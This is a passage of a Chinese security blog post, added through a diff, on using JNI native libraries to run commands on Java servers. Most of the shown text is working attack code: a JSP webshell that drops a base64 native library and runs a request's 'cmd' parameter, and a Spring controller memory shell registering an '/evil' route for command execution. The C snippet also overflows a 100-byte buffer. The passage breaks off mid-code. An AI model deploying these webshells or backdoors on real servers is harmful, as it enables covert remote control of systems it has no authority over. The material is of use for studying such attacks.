+    <span class="n">pclose</span><span class="p">(</span><span class="n">pipe</span><span class="p">);</span> <span class="c1">//关闭管道</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>      <span class="c1">//返回1表示运行成功</span>
+<span class="p">}</span>
+
+
+<span class="n">JNIEXPORT</span> <span class="kt">void</span> <span class="n">JNICALL</span> <span class="nf">Java_NativeLibraryExample_nativeMethod</span><span class="p">(</span><span class="n">JNIEnv</span> <span class="o">*</span><span class="n">env</span><span class="p">,</span> <span class="n">jobject</span> <span class="n">obj</span><span class="p">,</span> <span class="n">jstring</span> <span class="n">jstr</span><span class="p">)</span>
+
+<span class="p">{</span>
+
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cstr</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">GetStringUTFChars</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">jstr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="n">result</span><span class="p">[</span><span class="mi">1024</span> <span class="o">*</span> <span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span> <span class="c1">//定义存放结果的字符串数组</span>
+    <span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">==</span> <span class="n">execmd</span><span class="p">(</span><span class="n">cstr</span><span class="p">,</span> <span class="n">result</span><span class="p">))</span>
+    <span class="p">{</span>
+       <span class="c1">// printf(result);</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="n">return_messge</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">return_messge</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
+    <span class="n">jstring</span> <span class="n">cmdresult</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">env</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">NewStringUTF</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">return_messge</span><span class="p">);</span>
+    <span class="c1">//system();</span>
+
+    <span class="k">return</span> <span class="n">cmdresult</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<h4 id="第四步编译成-dll-或者-lib">第四步：编译成 dll 或者 lib</h4>
+<p>Linux 下使用的命令进行编译，编译时需要添加 jdk include 目录和 inlcude/linux 目录。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fPIC</span> <span class="nt">-I</span><span class="s2">"</span><span class="nv">$JAVA_HOME</span><span class="s2">/include"</span> <span class="nt">-I</span><span class="s2">"</span><span class="nv">$JAVA_HOME</span><span class="s2">/include/linux"</span> <span class="nt">-shared</span> <span class="nt">-o</span> libcmd.so JniClass.c
+</code></pre></div></div>
+
+<p>windows 环境使用如下的命令</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-I</span><span class="s2">"%JAVA_HOME%</span><span class="se">\i</span><span class="s2">nclude"</span> <span class="nt">-I</span><span class="s2">"%JAVA_HOME%</span><span class="se">\i</span><span class="s2">nclude</span><span class="se">\w</span><span class="s2">in32"</span> <span class="nt">-shared</span> <span class="nt">-o</span> libcmd.dll JniClass.c
+</code></pre></div></div>
+
+<h4 id="第五步加载-so-文件">第五步：加载 so 文件</h4>
+<p>修改 NativeLibraryExample 的 main 方法，使用 System.load 将 so 文件加载进来。</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">NativeLibraryExample</span> <span class="o">{</span>
+    <span class="c1">// 声明native方法</span>
+    <span class="kd">public</span> <span class="kd">native</span> <span class="kt">void</span> <span class="nf">nativeMethod</span><span class="o">(</span><span class="nc">String</span> <span class="n">cmd</span><span class="o">);</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="s">"/mnt/share/project/ctf_archives/test/test_jni/src/main/java/libNativeLibraryExample.so"</span><span class="o">);</span>
+        <span class="nc">NativeLibraryExample</span> <span class="n">example</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NativeLibraryExample</span><span class="o">();</span>
+
+        <span class="n">example</span><span class="o">.</span><span class="na">nativeMethod</span><span class="o">(</span><span class="s">"mate-calc"</span><span class="o">);</span> <span class="c1">// 调用native方法</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>调用 nativeMethod 执行命令。</p>
+
+<h3 id="实际场景下的-jni-利用">实际场景下的 JNI 利用</h3>
+<p>实际渗透场景中通常需要先将恶意链接库放入服务器中，大致可以分为如下的两种情形：</p>
+<ol>
+  <li>先利用文件上传漏洞将编译好的 so 或者 dll 放入服务器中，然后再加载运行。</li>
+  <li>先利用 webshell 将 so 或 dll 写入服务器，然后再加载运行。</li>
+</ol>
+
+<h4 id="jsp-webshell">JSP webshell</h4>
+<p>javasec 中的 JSP 示例如下，其代码的实现与正向开发有一些区别：</p>
+<ol>
+  <li>将定义的 Java 转化为字节数组，通过 defineClass 对其进行加载，从而获取到定义了 native 方法的 Java 类。</li>
+  <li>将 so 文件内容的 base64 编码定义为常量，加载这个 jsp 时，将 so 的内容写入到服务器临时文件目录下。</li>
+  <li>加载 so 时，并没有使用 System.load 函数，而是使用 ClassLoader.loadLibrary0 方法。实际上 System.load 底层也是调用的 ClassLoader.loadLibrary0。</li>
+  <li>调用过程采用反射完成。</li>
+</ol>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s">"text/html;charset=UTF-8"</span> <span class="n">language</span><span class="o">=</span><span class="s">"java"</span> <span class="o">%&gt;</span>
+<span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="kn">import</span><span class="err">="</span><span class="nn">java.io.File</span><span class="s">" %&gt;
+&lt;%@ page import="</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">FileOutputStream</span><span class="s">" %&gt;
+&lt;%@ page import="</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="s">" %&gt;
+&lt;%@ page import="</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span><span class="s">" %&gt;
+&lt;%-- load_library_cmd_all.jsp?cmd=ls --%&gt;
+&lt;%-- 通过JNI的方式调用动态链接库, 反射调用 ClassLoader 的 loadLibrary0 方法进行加载 --%&gt;
+&lt;%!
+    private static final String COMMAND_CLASS_NAME = "</span><span class="n">com</span><span class="o">.</span><span class="na">anbai</span><span class="o">.</span><span class="na">sec</span><span class="o">.</span><span class="na">cmd</span><span class="o">.</span><span class="na">CommandExecution</span><span class="s">";
+
+    /**
+     * JDK1.5编译的com.anbai.sec.cmd.CommandExecution类字节码,
+     * 只有一个public static native String exec(String cmd);的方法
+     */
+    private static final byte[] COMMAND_CLASS_BYTES = new byte[]{
+            -54, -2, -70, -66, 0, 0, 0, 49, 0, 15, 10, 0, 3, 0, 12, 7, 0, 13, 7, 0, 14, 1,
+            0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,
+            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108,
+            101, 1, 0, 4, 101, 120, 101, 99, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97,
+            110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108,
+            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114,
+            99, 101, 70, 105, 108, 101, 1, 0, 21, 67, 111, 109, 109, 97, 110, 100, 69, 120,
+            101, 99, 117, 116, 105, 111, 110, 46, 106, 97, 118, 97, 12, 0, 4, 0, 5, 1, 0, 34,
+            99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 109, 100, 47, 67,
+            111, 109, 109, 97, 110, 100, 69, 120, 101, 99, 117, 116, 105, 111, 110, 1, 0, 16,
+            106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0,
+            2, 0, 3, 0, 0, 0, 0, 0, 2, 0, 1, 0, 4, 0, 5, 0, 1, 0, 6, 0, 0, 0, 29, 0, 1, 0, 1,
+            0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 7, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 1,
+            9, 0, 8, 0, 9, 0, 0, 0, 1, 0, 10, 0, 0, 0, 2, 0, 11
+    };
+
+    /**
+     * 获取JNI链接库目录
+     * @return 返回缓存JNI的临时目录
+     */
+    File getTempJNILibFile() {
+        File jniDir = new File(System.getProperty("</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">tmpdir</span><span class="s">"), "</span><span class="n">jni</span><span class="o">-</span><span class="n">lib</span><span class="s">");
+
+        if (!jniDir.exists()) {
+            jniDir.mkdir();
+        }
+
+        String filename;
+
+        if (isWin()) {
+            filename = "</span><span class="n">cmd</span><span class="o">.</span><span class="na">dll</span><span class="s">";
+        } else {
+            if (isMac()) {
+                filename = "</span><span class="n">libcmd</span><span class="o">.</span><span class="na">lib</span><span class="s">";
+            } else {
+                filename = "</span><span class="n">libcmd</span><span class="o">.</span><span class="na">so</span><span class="s">";
+            }
+        }
+
+
+        return new File(jniDir, filename);
+    }
+
+
+    boolean isWin() {
+        return (System.getProperty("</span><span class="n">os</span><span class="o">.</span><span class="na">name</span><span class="s">") != null &amp;&amp; System.getProperty("</span><span class="n">os</span><span class="o">.</span><span class="na">name</span><span class="s">").startsWith("</span><span class="nc">Win</span><span class="s">"));
+    }
+
+    boolean isWin32() {
+        return "</span><span class="mi">32</span><span class="s">".equals(System.getProperty("</span><span class="n">sun</span><span class="o">.</span><span class="na">arch</span><span class="o">.</span><span class="na">data</span><span class="o">.</span><span class="na">model</span><span class="s">"));
+    }
+
+    boolean isMac() {
+        return (System.getProperty("</span><span class="n">os</span><span class="o">.</span><span class="na">name</span><span class="s">") != null &amp;&amp; System.getProperty("</span><span class="n">os</span><span class="o">.</span><span class="na">name</span><span class="s">").startsWith("</span><span class="nc">Mac</span><span class="s">"));
+    }
+
+
+    /**
+     * 高版本JDKsun.misc.BASE64Decoder已经被移除，低版本JDK又没有java.util.Base64对象，
+     * 所以还不如直接反射自动找这两个类，哪个存在就用那个decode。
+     * @param str
+     * @return
+     */
+    byte[] base64Decode(String str) {
+        try {
+            try {
+                Class clazz = Class.forName("</span><span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="s">");
+                return (byte[]) clazz.getMethod("</span><span class="n">decodeBuffer</span><span class="s">", String.class).invoke(clazz.newInstance(), str);
+            } catch (ClassNotFoundException e) {
+                Class  clazz   = Class.forName("</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="s">");
+                Object decoder = clazz.getMethod("</span><span class="n">getDecoder</span><span class="s">").invoke(null);
+                return (byte[]) decoder.getClass().getMethod("</span><span class="n">decode</span><span class="s">", String.class).invoke(decoder, str);
+            }
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    /**
+     * 写JNI链接库文件
+     * @param base64 JNI动态库Base64
+     * @return 返回是否写入成功
+     */
+    void writeJNILibFile(String base64) throws IOException {
+        if (base64 != null) {
+            File jniFile = getTempJNILibFile();
+
+            if (!jniFile.exists()) {
+                byte[] bytes = base64Decode(base64);
+
+                if (bytes != null) {
+                    FileOutputStream fos = new FileOutputStream(jniFile);
+                    fos.write(bytes);
+                    fos.flush();
+                    fos.close();
+                }
+            }
+        }
+    }
+%&gt;
+&lt;%
+    String cmd = request.getParameter("</span><span class="n">cmd</span><span class="s">");
+    String jniBytes = request.getParameter("</span><span class="n">jni</span><span class="s">");
+
+
+    String COMMAND_JNI_FILE_BYTES;
+    if (isWin()) {
+        if (isWin32()) {
+            // windows 32
+            COMMAND_JNI_FILE_BYTES = "</span><span class="n">省略具体的Base64编码信息</span><span class="err">，</span><span class="n">请参考javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">/</span><span class="n">javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">-</span><span class="n">source</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">test</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">vuls</span><span class="o">-</span><span class="n">struts2</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">main</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">jni</span><span class="o">/</span><span class="n">loadlibrary</span><span class="o">.</span><span class="na">jsp</span><span class="s">";
+        } else {
+            // windows 64
+            COMMAND_JNI_FILE_BYTES = "</span><span class="n">省略具体的Base64编码信息</span><span class="err">，</span><span class="n">请参考javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">/</span><span class="n">javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">-</span><span class="n">source</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">test</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">vuls</span><span class="o">-</span><span class="n">struts2</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">main</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">jni</span><span class="o">/</span><span class="n">loadlibrary</span><span class="o">.</span><span class="na">jsp</span><span class="s">";
+        }
+    } else {
+        if (isMac()) {
+            // mac
+            COMMAND_JNI_FILE_BYTES = "</span><span class="n">省略具体的Base64编码信息</span><span class="err">，</span><span class="n">请参考javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">/</span><span class="n">javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">-</span><span class="n">source</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">test</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">vuls</span><span class="o">-</span><span class="n">struts2</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">main</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">jni</span><span class="o">/</span><span class="n">loadlibrary</span><span class="o">.</span><span class="na">jsp</span><span class="s">";
+        } else {
+            // centos 7 64
+            COMMAND_JNI_FILE_BYTES = "</span><span class="n">省略具体的Base64编码信息</span><span class="err">，</span><span class="n">请参考javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">/</span><span class="n">javaweb</span><span class="o">-</span><span class="n">sec</span><span class="o">-</span><span class="n">source</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">test</span><span class="o">/</span><span class="n">javasec</span><span class="o">-</span><span class="n">vuls</span><span class="o">-</span><span class="n">struts2</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">main</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">jni</span><span class="o">/</span><span class="n">loadlibrary</span><span class="o">.</span><span class="na">jsp</span><span class="s">";
+        }
+    }
+
+
+    // JNI路径
+    File jniFile = getTempJNILibFile();
+    ClassLoader loader = (ClassLoader) application.getAttribute("</span><span class="n">__LOADER__</span><span class="s">");
+
+    if (loader == null) {
+        loader = new ClassLoader(this.getClass().getClassLoader()) {
+            @Override
+            protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+                try {
+                    return super.findClass(name);
+                } catch (ClassNotFoundException e) {
+                    return defineClass(COMMAND_CLASS_NAME, COMMAND_CLASS_BYTES, 0, COMMAND_CLASS_BYTES.length);
+                }
+            }
+        };
+
+        writeJNILibFile(jniBytes != null ? jniBytes : COMMAND_JNI_FILE_BYTES);// 写JNI文件到临时文件目录
+
+        application.setAttribute("</span><span class="n">__LOADER__</span><span class="s">", loader);
+    }
+
+    try {
+        // load命令执行类
+        Class  commandClass = loader.loadClass("</span><span class="n">com</span><span class="o">.</span><span class="na">anbai</span><span class="o">.</span><span class="na">sec</span><span class="o">.</span><span class="na">cmd</span><span class="o">.</span><span class="na">CommandExecution</span><span class="s">");
+        Object loadLib      = application.getAttribute("</span><span class="n">__LOAD_LIB__</span><span class="s">");
+
+        if (loadLib == null || !((Boolean) loadLib)) {
+            Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod("</span><span class="n">loadLibrary0</span><span class="s">", Class.class, File.class);
+            loadLibrary0Method.setAccessible(true);
+            loadLibrary0Method.invoke(loader, commandClass, jniFile);
+            application.setAttribute("</span><span class="n">__LOAD_LIB__</span><span class="s">", true);
+        }
+
+        String content = (String) commandClass.getMethod("</span><span class="n">exec</span><span class="s">", String.class).invoke(null, cmd);
+        out.println("</span><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;</span><span class="s">");
+        out.println(content);
+        out.println("</span><span class="o">&lt;/</span><span class="n">pre</span><span class="o">&gt;</span><span class="err">"</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
+    <span class="o">}</span>
+
+<span class="o">%&gt;</span>
+</code></pre></div></div>
+<p>代码中的 COMMAND_JNI_FILE_BYTES 内容较大，具体文件内容可见：<a href="https://github.com/javaweb-sec/javaweb-sec/blob/master/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp">javaweb-sec/javaweb-sec-source/javasec-test/javasec-vuls-struts2/src/main/webapp/modules/jni/loadlibrary.jsp at master · javaweb-sec/javaweb-sec · GitHub</a></p>
+
+<p>脚本中需要先将 .class 转化为字节数组，代码如下：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">getBytesArrayFromClassFile</span><span class="o">(</span><span class="nc">String</span> <span class="n">classFilePath</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+    <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">classFilePath</span><span class="o">));</span>
+    <span class="k">for</span><span class="o">(</span><span class="kt">byte</span> <span class="n">b</span> <span class="o">:</span> <span class="n">classBytes</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="n">b</span><span class="o">);</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">","</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="k">return</span> <span class="n">classBytes</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h4 id="反序列化利用">反序列化利用</h4>
+<p>反序列化利用时实现原理与 JSP 一致，也同样需要将 so 文件内容的 base64 编码定义为常量，在反序列化触发时，将 so 的内容写入到服务器临时文件目录下，再进行加载。</p>
+
+<p>我们可以在一个普通的 controller 内存马的基础上，将其改造成 JNI 内存马。controller 内存马如下, 该内存马重写了 index 方法，并在静态代码块中将自身添加到 RequestMapping 中。</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.ResponseBody</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.springframework.web.util.pattern.PathPatternParser</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SpringControllerMemshell</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">inject_uri</span> <span class="o">=</span> <span class="s">"/evil"</span><span class="o">;</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Controller Injecting"</span><span class="o">);</span>
+            <span class="nc">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="nc">WebApplicationContext</span><span class="o">)</span> <span class="nc">RequestContextHolder</span><span class="o">.</span>
+                    <span class="nf">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+            <span class="nc">RequestMappingHandlerMapping</span> <span class="n">mappingHandlerMapping</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="nc">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+
+            <span class="nc">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">mappingHandlerMapping</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"mappingRegistry"</span><span class="o">);</span>
+            <span class="n">f</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="nc">Object</span> <span class="n">mappingRegistry</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">mappingHandlerMapping</span><span class="o">);</span>
+
+            <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry"</span><span class="o">);</span>
+
+
+            <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"urlLookup"</span><span class="o">);</span>
+                <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">NoSuchFieldException</span> <span class="n">e</span><span class="o">){</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"pathLookup"</span><span class="o">);</span>
+                <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;</span> <span class="n">urlLookup</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">Object</span><span class="o">&gt;)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">mappingRegistry</span><span class="o">);</span>
+            <span class="k">for</span> <span class="o">(</span><span class="nc">String</span> <span class="n">urlPath</span> <span class="o">:</span> <span class="n">urlLookup</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">inject_uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">urlPath</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">();</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+
+            <span class="nc">Class</span> <span class="o">&lt;?&gt;</span> <span class="n">evilClass</span> <span class="o">=</span> <span class="nc">SpringControllerMemshell</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+
+            <span class="nc">Method</span> <span class="n">method2</span> <span class="o">=</span> <span class="n">evilClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"index"</span><span class="o">);</span>
+
+            <span class="nc">RequestMappingInfo</span><span class="o">.</span><span class="na">BuilderConfiguration</span> <span class="n">option</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">RequestMappingInfo</span><span class="o">.</span><span class="na">BuilderConfiguration</span><span class="o">();</span>
+            <span class="n">option</span><span class="o">.</span><span class="na">setPatternParser</span><span class="o">(</span><span class="k">new</span> <span class="nc">PathPatternParser</span><span class="o">());</span>
+
+            <span class="nc">RequestMappingInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="nc">RequestMappingInfo</span><span class="o">.</span><span class="na">paths</span><span class="o">(</span><span class="n">inject_uri</span><span class="o">).</span><span class="na">options</span><span class="o">(</span><span class="n">option</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>
+
+            <span class="c1">// 将该controller注册到Spring容器</span>
+            <span class="n">mappingHandlerMapping</span><span class="o">.</span><span class="na">registerMapping</span><span class="o">(</span><span class="n">info</span><span class="o">,</span> <span class="n">evilClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(),</span> <span class="n">method2</span><span class="o">);</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Controller Injected"</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">index</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
+        <span class="c1">// 获取请求</span>
+        <span class="nc">HttpServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="o">((</span><span class="nc">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="nc">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getRequest</span><span class="o">();</span>
+        <span class="nc">HttpServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="o">((</span><span class="nc">ServletRequestAttributes</span><span class="o">)</span> <span class="o">(</span><span class="nc">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">())).</span><span class="na">getResponse</span><span class="o">();</span>
+        <span class="c1">// 获取请求的参数cmd并执行</span>
+        <span class="c1">// 类似于PHP的system($_GET["cmd"])</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"cmd"</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">cmd</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">"os.name"</span><span class="o">);</span>
